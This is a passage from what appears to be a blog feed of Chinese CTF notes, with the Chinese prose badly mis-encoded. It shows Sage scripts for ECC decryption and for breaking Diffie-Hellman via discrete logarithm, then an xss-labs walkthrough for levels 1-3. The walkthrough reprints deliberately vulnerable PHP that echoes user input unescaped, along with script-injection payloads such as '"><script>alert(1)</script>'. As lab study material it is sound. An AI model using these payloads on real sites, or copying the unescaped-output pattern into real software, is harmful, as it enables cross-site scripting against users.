class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ï¼Œå¦‚æœä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span>ï¼Œåˆ™ä»ç¬¬äºŒæ­¥é‡æ–°å¼€å§‹</li><li>è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mi>m</mi><mo>+</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C=m+(x_{2},y_{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li>å°†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>C</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">((x_{1},y_{1}),C)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span></span></span></span>å‘é€ç»™A</li></ol><h4 id="decry"><a class="markdownIt-Anchor" href="#decry"></a> Decry:</h4><p>â€‹è§£å¯†æ­¥éª¤å¦‚ä¸‹</p><ol><li>åˆ©ç”¨ç§é’¥è®¡ç®—ç‚¹<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>a</mi></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>n</mi><mi>a</mi></msub><mi>k</mi><mi>G</mi><mo>=</mo><mi>k</mi><msub><mi>P</mi><mi>a</mi></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n_{a}(x_{1},y_{1})=n_{a}kG=kP_{a}=(x_{2},y_{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li>è®¡ç®—æ¶ˆæ¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>C</mi><mo>âˆ’</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m=C-(x_{2},y_{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li></ol><h4 id="è§£å¯†è„šæœ¬"><a class="markdownIt-Anchor" href="#è§£å¯†è„šæœ¬"></a> è§£å¯†è„šæœ¬</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage <span class="hljs-keyword">import</span> *<br>n=<br>p=<br>a=<br>b=<br>E = EllipticCurve(GF(p), [a, b])<br><br>G=(, )<br>G=E(G)<br>Pa=(, ) <br>Pa=E(Pa)<br>P1=(, )<br>P1=E(P1)<br>c=(, )<br>c=E(c)<br>m=c-n*P1<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(m.xy()[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure><h4 id="dhå…±äº«å¯†é’¥ç ´è§£"><a class="markdownIt-Anchor" href="#dhå…±äº«å¯†é’¥ç ´è§£"></a> DHå…±äº«å¯†é’¥ç ´è§£</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage <span class="hljs-keyword">import</span> *<br>N = <br>g = GF(N)()<br>A = <br>B = <br>a=discrete_log(A,g)<br>b=discrete_log(B,g)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Alice secret:&#x27;</span>,a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bod secret:&#x27;</span>,b)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">pow</span>(B,a,N)==<span class="hljs-built_in">pow</span>(A,b,N)<br>shared_secret=power_mod(B,a,N)<br></code></pre></td></tr></table></figure><h3 id="å‚è€ƒèµ„æ–™"><a class="markdownIt-Anchor" href="#å‚è€ƒèµ„æ–™"></a> <em>å‚è€ƒèµ„æ–™</em></h3><p><em><a href="https://ctf-wiki.org/crypto/asymmetric/discrete-log/ecc/">https://ctf-wiki.org/crypto/asymmetric/discrete-log/ecc/</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/01/25/XSS/"/>
    <url>/2023/01/25/XSS/</url>
    
    <content type="html"><![CDATA[<h3 id="xssåŸºç¡€"><a class="markdownIt-Anchor" href="#xssåŸºç¡€"></a> XSSåŸºç¡€</h3><p>è·¨ç«™è„šæœ¬ï¼ˆCross-Site Scriptingï¼ŒXSSï¼‰æ˜¯ä¸€ç§ç»å¸¸å‡ºç°åœ¨ WEB åº”ç”¨ç¨‹åºä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œæ˜¯ç”±äº WEB åº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·çš„è¾“å…¥è¿‡æ»¤ä¸è¶³è€Œäº§ç”Ÿçš„ã€‚æ”»å‡»è€…åˆ©ç”¨ç½‘ç«™æ¼æ´æŠŠæ¶æ„çš„è„šæœ¬ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œå½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™äº›ç½‘é¡µæ—¶ï¼Œå°±ä¼šæ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç ï¼Œå¯¹å—å®³ç”¨æˆ·å¯èƒ½é‡‡å– Cookies èµ„æ–™çªƒå–ã€ä¼šè¯åŠ«æŒã€é’“é±¼æ¬ºéª—ç­‰å„ç§æ”»å‡»ã€‚</p><h3 id="åå°„å‹-xss"><a class="markdownIt-Anchor" href="#åå°„å‹-xss"></a> åå°„å‹ XSS</h3><p>åå°„å‹è·¨ç«™è„šæœ¬ï¼ˆReflected Cross-Site Scriptingï¼‰æ˜¯æœ€å¸¸è§ï¼Œä¹Ÿæ˜¯ä½¿ç”¨æœ€å¹¿çš„ä¸€ç§ï¼Œå¯å°†æ¶æ„è„šæœ¬é™„åŠ åˆ° URL åœ°å€çš„å‚æ•°ä¸­ã€‚</p><p>åå°„å‹ XSS çš„åˆ©ç”¨ä¸€èˆ¬æ˜¯æ”»å‡»è€…é€šè¿‡ç‰¹å®šæ‰‹æ³•ï¼ˆå¦‚ç”µå­é‚®ä»¶ï¼‰ï¼Œè¯±ä½¿ç”¨æˆ·å»è®¿é—®ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„ URLï¼Œå½“å—å®³è€…ç‚¹å‡»è¿™äº›ä¸“é—¨è®¾è®¡çš„é“¾æ¥çš„æ—¶å€™ï¼Œæ¶æ„ä»£ç ä¼šç›´æ¥åœ¨å—å®³è€…ä¸»æœºä¸Šçš„æµè§ˆå™¨æ‰§è¡Œã€‚æ­¤ç±» XSS é€šå¸¸å‡ºç°åœ¨ç½‘ç«™çš„æœç´¢æ ã€ç”¨æˆ·ç™»å½•å£ç­‰åœ°æ–¹ï¼Œå¸¸ç”¨æ¥çªƒå–å®¢æˆ·ç«¯ Cookies æˆ–è¿›è¡Œé’“é±¼æ¬ºéª—ã€‚</p><p>ä¾‹å¦‚</p><h4 id="xss-labslevel1php"><a class="markdownIt-Anchor" href="#xss-labslevel1php"></a> xss-labs/level1.php</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;å®Œæˆçš„ä¸é”™ï¼&quot;);<br> window.location.href=&quot;level2.php?keyword=test&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level1&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level1&lt;/h1&gt;<br>&lt;?php <br>ini_set(&quot;display_errors&quot;, 0);<br>$str = $_GET[&quot;name&quot;];<br>echo &quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;.$str.&quot;&lt;/h2&gt;&quot;;<br>?&gt;<br>&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;<br>&lt;?php <br>echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;<br>?&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">$<span class="hljs-built_in">str</span> = $<span class="hljs-variable">_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;</span>.$<span class="hljs-built_in">str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;<br>è¿™é‡Œ<span class="hljs-built_in">name</span>ç›´æ¥ä½œä¸ºå‚æ•°æ”¾åˆ°htmlæ ‡ç­¾ä¸­ï¼Œæ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤å’Œæ£€æŸ¥ï¼Œå­˜åœ¨æ˜æ˜¾çš„ XSS æ¼æ´ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">window.alert <span class="hljs-operator">=</span> function()  <br>&#123;     <br>confirm(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>)<span class="hljs-comment">;</span><br> window.location.href<span class="hljs-operator">=</span><span class="hljs-string">&quot;level2.php?keyword=test&quot;</span><span class="hljs-comment">; </span><br>&#125;<br>é‡å†™alertï¼Œå½“è§¦å‘alertæ—¶ä¼šé€šå…³<br></code></pre></td></tr></table></figure><p>exp:<code>name=&lt;script&gt;alert('aaa')&lt;/script&gt;</code></p><h4 id="xss-labslevel2php"><a class="markdownIt-Anchor" href="#xss-labslevel2php"></a> xss-labs/level2.php</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;å®Œæˆçš„ä¸é”™ï¼&quot;);<br> window.location.href=&quot;level3.php?writing=wait&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level2&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level2&lt;/h1&gt;<br>&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;<br>&lt;form action=level2.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;<br>&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payloadçš„é•¿åº¦:25&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ä¸¤å¤„htmlæ ‡ç­¾ç›´æ¥ç”¨åˆ°äº†å‚æ•°å†…å®¹ï¼Œä½†æœ‰ä¸€å¤„è¢«è½¬ä¹‰äº†</p><p>åªèƒ½å€Ÿç”¨&lt;input&gt;æ ‡ç­¾<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></p><h4 id="xss-lablevel3php"><a class="markdownIt-Anchor" href="#xss-lablevel3php"></a> xss-lab/level3.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level3&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level3&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&quot;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level3.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&#x27;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span 